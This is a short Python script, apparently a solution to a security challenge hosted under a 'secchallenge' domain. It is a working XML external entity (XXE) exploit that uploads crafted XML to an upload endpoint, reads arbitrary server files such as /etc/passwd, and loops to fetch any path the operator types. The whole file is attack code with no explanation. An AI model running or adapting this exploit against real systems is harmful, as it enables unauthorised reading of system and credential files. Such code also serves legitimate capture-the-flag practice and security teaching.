import requests
import base64 
import readline 


foo = '/etc/passwd'
def get(foo):

    st=f'<?xml version="1.0" encoding="UTF-8"?>\n'\
    f'<!DOCTYPE foo [ \n'\
    f'    <!ENTITY licenseNumber SYSTEM "file://{foo}"> \n'\
    f']>\n'\
    f'<licenseNumber>\n'\
    f'    `&licenseNumber;`\n'\
    f'</licenseNumber>\n'

    files = {'file': ('x.xml', st)}

    r = requests.post('https://manual-for-the-apocalypse.secchallenge.crysys.hu/upload.php',
    files=files)

    print(base64.b64decode(r.text).decode("utf-8"))

while True:
    st = input('>')
    if st == '':
        break
    get(st)